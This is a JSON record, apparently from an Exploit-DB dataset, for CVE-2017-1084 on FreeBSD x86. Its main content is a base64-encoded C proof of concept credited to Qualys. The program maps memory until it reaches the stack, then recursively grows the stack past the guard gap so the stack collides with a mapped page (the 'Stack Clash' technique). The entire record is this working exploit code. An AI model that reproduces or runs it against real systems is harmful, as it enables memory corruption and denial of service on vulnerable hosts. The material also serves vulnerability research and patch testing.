{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIEZyZWVCU0RfQ1ZFLTIwMTctRkdQRS5jIGZvciBDVkUtMjAxNy0xMDg0IChwbGVhc2UgY29tcGlsZSB3aXRoIC1PMCkNCiAqIENvcHlyaWdodCAoQykgMjAxNyBRdWFseXMsIEluYy4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTogeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQ0KICogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkNCiAqIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yDQogKiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLg0KICoNCiAqIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLA0KICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCiAqIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCiAqIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuDQogKg0KICogWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCiAqIGFsb25nIHdpdGggdGhpcyBwcm9ncmFtLiAgSWYgbm90LCBzZWUgPGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy8+Lg0KICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQojaW5jbHVkZSA8c3lzL3Jlc291cmNlLmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCg0KI2RlZmluZSBkaWUoKSBkbyB7IFwNCiAgICBmcHJpbnRmKHN0ZGVyciwgImRpZWQgaW4gJXM6ICV1XG4iLCBfX2Z1bmNfXywgX19MSU5FX18pOyBcDQogICAgZXhpdChFWElUX0ZBSUxVUkUpOyBcDQp9IHdoaWxlICgwKQ0KDQpzdGF0aWMgY29uc3QgY2hhciAqIGxhc3RfcGFnZTsNCg0Kc3RhdGljIHZvaWQNCmFsbG9jKGNvbnN0IGNoYXIgKiBjb25zdCBmaW5hbCkNCnsNCiAgICBmb3IgKDs7KSB7DQogICAgICAgIGxhc3RfcGFnZSA9IG1tYXAoTlVMTCwgNDA5NiwgUFJPVF9SRUFEIHwgUFJPVF9XUklURSwgTUFQX1BSSVZBVEUgfCBNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQogICAgICAgIGlmIChsYXN0X3BhZ2UgPT0gTUFQX0ZBSUxFRCkgZGllKCk7DQogICAgICAgIGlmIChsYXN0X3BhZ2UgPj0gZmluYWwpIGJyZWFrOw0KICAgIH0NCn0NCg0Kc3RhdGljIHZvaWQNCmNsYXNoX3NtYXNoX25vX2p1bXAoY29uc3Qgc2l6ZV90IHNtYXNoX3NpemUpDQp7DQogICAgY2hhciBidWZbMTAyNF07DQogICAgbWVtc2V0KGJ1ZiwgJ0EnLCBzaXplb2YoYnVmKSk7DQogICAgaWYgKHNtYXNoX3NpemUgPiBzaXplb2YoYnVmKSkNCiAgICAgICAgY2xhc2hfc21hc2hfbm9fanVtcChzbWFzaF9zaXplIC0gc2l6ZW9mKGJ1ZikpOw0KfQ0KDQojZGVmaW5lIFNHUk9XU0laICAgICAgICAoKHNpemVfdCkxMjhVTCoxMDI0KSAgICAgICAgICAgIC8qIGFtb3VudCB0byBncm93IHN0YWNrICovDQoNCmludA0KbWFpbih2b2lkKQ0Kew0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgcmxpbWl0IGNvcmU7DQogICAgaWYgKHNldHJsaW1pdChSTElNSVRfQ09SRSwgJmNvcmUpKSBkaWUoKTsNCg0KICAgIHN0cnVjdCBybGltaXQgc3RhY2s7DQogICAgaWYgKGdldHJsaW1pdChSTElNSVRfU1RBQ0ssICZzdGFjaykpIGRpZSgpOw0KICAgIGNvbnN0IHNpemVfdCBzbWFzaF9zaXplID0gc3RhY2sucmxpbV9jdXIgLyAzICogMjsNCiAgICBjb25zdCBzaXplX3QgZmluYWxfZGlzdCA9IGFyYzRyYW5kb20oKSAlIHNtYXNoX3NpemU7DQoNCiAgICBhbGxvYygoY29uc3QgY2hhciAqKSZzdGFjayAtIGZpbmFsX2Rpc3QpOw0KICAgIGNsYXNoX3NtYXNoX25vX2p1bXAoc21hc2hfc2l6ZSk7DQogICAgcHJpbnRmKCJjaGFyIGF0ICVwOiAlMDJ4OyBmaW5hbCBkaXN0ICV6dSAoJXp1KVxuIiwgbGFzdF9wYWdlLCAqbGFzdF9wYWdlLCBmaW5hbF9kaXN0ICUgU0dST1dTSVosIGZpbmFsX2Rpc3QpOw0KICAgIGV4aXQoRVhJVF9TVUNDRVNTKTsNCn0=", 
    "filename": "platforms/freebsd_x86/dos/42278.c", 
    "id": "42278", 
    "cves": [
        "CVE-2017-1084"
    ]
}